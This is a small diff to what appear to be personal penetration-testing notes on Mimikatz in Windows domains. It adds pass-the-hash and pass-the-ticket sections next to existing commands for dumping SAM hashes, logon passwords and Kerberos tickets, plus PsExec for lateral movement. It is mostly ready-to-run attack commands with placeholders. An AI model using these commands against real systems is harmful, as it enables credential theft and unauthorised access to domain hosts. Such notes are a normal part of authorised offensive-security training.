@@ -239,14 +239,22 @@ token::elevate
 lsadump::sam
 sekurlsa::logonpasswords
 ```
-
+#pth #overpass-the-hash 
 ```powershell
 sekurlsa::pth /user:$USER /domain:$TARGET_DOMAIN /ntlm:$HASH /run:powershell
 #on the new powershell
 net use \\$TARGET_IP
 .\PsExec.exe \\$TARGET_IP cmd
 ```
+#pass-the-ticket
 
+```poweshell
+privilege::debug
+sekurlsa::tickets /export
+#ls *.kirbi
+#select ticket from target host
+kerberos::ptt $TICKET
+```
 mimikatz as domain admin:
 #mimikatz #dcsync #dc-sync #krbtgt
 ```powershell
